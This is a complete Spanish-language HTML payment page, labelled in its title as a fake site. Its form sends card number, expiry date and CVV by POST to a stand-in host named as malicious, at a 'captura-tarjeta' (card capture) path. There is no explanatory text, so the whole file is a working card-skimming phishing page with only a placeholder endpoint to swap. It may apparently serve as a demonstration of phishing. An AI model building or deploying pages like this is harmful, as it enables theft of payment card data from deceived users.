<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Pago - Sitio Falso</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }

        .payment-container {
            display: inline-block;
            padding: 20px;
            background-color: #f4f4f4;
            border: 1px solid #ccc;
            border-radius: 8px;
        }

        input[type="text"] {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
        }

        button {
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <h2>Formulario de Pago</h2>
        <form action="https://sitio-malicioso.com/captura-tarjeta" method="POST">
            <input type="text" name="card-number" placeholder="Número de Tarjeta">
            <input type="text" name="expiry-date" placeholder="Fecha de Expiración">
            <input type="text" name="cvv" placeholder="CVV">
            <button type="submit">Procesar Pago</button>
        </form>
    </div>
</body>
</html>
